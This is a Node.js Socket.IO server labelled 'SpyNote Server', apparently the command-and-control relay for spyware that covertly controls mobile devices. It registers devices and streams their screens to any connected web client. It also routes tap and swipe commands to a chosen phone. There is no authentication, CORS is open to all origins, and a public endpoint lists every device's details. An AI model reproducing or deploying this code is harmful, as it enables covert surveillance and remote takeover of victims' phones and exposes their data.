const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 30000,
    pingInterval: 10000,
    maxHttpBufferSize: 50e6
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ limit: '100mb', extended: true }));

const devices = new Map();

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log('🔌 Socket connected:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true, 
                socketId: socket.id,
                lastSeen: Date.now()
            });
            socket.join(`device_${deviceId}`);
            console.log('✅ DEVICE REGISTERED:', deviceId, deviceInfo.model);
            io.emit('devices-update', Array.from(devices.entries()));
        }
    });

    // 🔥 FIXED: Web client selects device
    socket.on('select-device', (data) => {
        console.log('🎯 Web selected:', data.deviceId);
        // Notify all clients about selection
        io.emit('device-selected', data.deviceId);
    });

    // 🔥 FIXED: Direct frame relay from device to web clients
    socket.on('screen-frame', (frameData) => {
        const deviceId = frameData.deviceId;
        console.log('📱 Frame received from:', deviceId.slice(0,8)); // Debug log
        
        if (devices.has(deviceId)) {
            const device = devices.get(deviceId);
            devices.set(deviceId, { ...device, lastSeen: Date.now() });
            
            // Broadcast to ALL web clients (room system optional)
            socket.broadcast.emit('screen-frame', frameData);
            // Also send to device-specific room
            socket.to(`device_${deviceId}`).emit('screen-frame', frameData);
        }
    });

    // 🔥 FIXED: Control commands ROUTE CORRECTLY to device
    socket.on('control', (controlData) => {
        const { deviceId, action, x, y, startX, startY, endX, endY } = controlData;
        console.log('🎮 CONTROL:', action, '→', deviceId?.slice(0,8));
        
        if (devices.has(deviceId)) {
            const deviceSocketId = devices.get(deviceId).socketId;
            // Send to SPECIFIC device socket/room
            io.to(`device_${deviceId}`).emit('control', {
                action,
                x: parseFloat(x) || 0,
                y: parseFloat(y) || 0,
                startX: parseFloat(startX) || 0,
                startY: parseFloat(startY) || 0,
                endX: parseFloat(endX) || 0,
                endY: parseFloat(endY) || 0
            });
        }
    });

    socket.on('disconnect', () => {
        console.log('🔌 Socket disconnected:', socket.id);
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                io.emit('devices-update', Array.from(devices.entries()));
                console.log('📱 Device OFFLINE:', deviceId);
                break;
            }
        }
    });
});

// Keepalive
setInterval(() => {
    const now = Date.now();
    for (const [deviceId, info] of devices.entries()) {
        if (info.connected && (now - info.lastSeen > 30000)) {
            devices.set(deviceId, { ...info, connected: false });
            io.emit('devices-update', Array.from(devices.entries()));
        }
    }
}, 30000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 SpyNote Server on http://localhost:${PORT}`);
});
